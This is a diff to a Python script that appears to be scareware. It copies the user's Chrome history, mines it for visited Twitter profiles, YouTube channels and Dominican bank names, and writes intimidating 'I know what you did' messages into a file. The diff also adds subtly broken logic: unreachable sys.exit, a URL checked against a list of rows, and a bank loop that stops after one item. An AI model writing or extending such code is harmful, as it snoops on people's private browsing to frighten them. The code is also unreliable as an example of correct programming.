@@ -2,6 +2,7 @@
 #Importando librerias
 
 import os
+import sys
 import re
 import sqlite3
 from shutil import copyfile
@@ -20,9 +21,19 @@ def create_hacker_file(desktop_path):
 #Funcion para obtener el historial de Chrome
 def get_chrome_history():
     urls = None
+    history_path = ""
+    if os.path.exists(os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Profile 1/History'):
+        print("El historial de chrome esta en Profiles")
+        history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Profile 1/History'
+    elif os.path.exists(os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Default/History'):
+        print("El historial de chrome esta en Default")
+        history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Default/History'
+    else:
+        print("No tiene Chrome instalado o no se pudo encontrar el historial de chrome")
+        return
+        sys.exit()
     while not urls:
         try:
-            history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Profile 1/History'
             temp_history = history_path + "temp"
             copyfile(history_path, temp_history)
             con = sqlite3.connect(temp_history)
@@ -45,6 +56,8 @@ def delay_action():
     sleep(n_houers)
 
 def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
+    if chrome_history == None:
+        return
     profiles_visited = []
     for item in chrome_history:
         results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
@@ -54,6 +67,8 @@ def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
                       f"interesante.....")
 
 def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
+    if chrome_history == None:
+        return
     profiles_visited = set()
     forbidden_urls = [
         "https://www.youtube.com/watch",
@@ -65,13 +80,17 @@ def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
         chequer = url.startswith("https://www.youtube.com") and not any(url.startswith(x) for x in forbidden_urls)
         channel_name = re.sub(r" - youtube$", "", title, flags=re.IGNORECASE)
         channel_name = re.sub(r"^\(\d+\)\s*", "", channel_name)
-        if chequer:
+        if chequer and "https://www.youtube.com" in chrome_history:
             if channel_name:
                 profiles_visited.add(channel_name)
+        else:
+            return
     hacker_file.write(f"\n\nTambien he visto que has visitado los canales de YouTube de {', '.join(profiles_visited)}, "
                       f"ajaaaa.....")
 
 def check_bank_account(hackage_file,chrome_history):
+    if chrome_history == None:
+        return
     his_bank = None
     banks = ["Banreservas", "BHD", "Popular"]
     for item in chrome_history:
@@ -80,8 +99,12 @@ def check_bank_account(hackage_file,chrome_history):
                 his_bank = b
                 break
         if his_bank:
+            print("Banco encontrado")
+            hackage_file.write(f"\n\nAdemas veo que guardas tu dinero en el banco {his_bank}, ta fichao!!!")
             break
-    hackage_file.write(f"\n\nAdemas veo que guardas tu dinero en el banco {his_bank}, ta fichao!!!")
+        else:
+            print("No se pudo encontrar el banco")
+            break
 
 def check_steam_games(hackage_file):
     try:
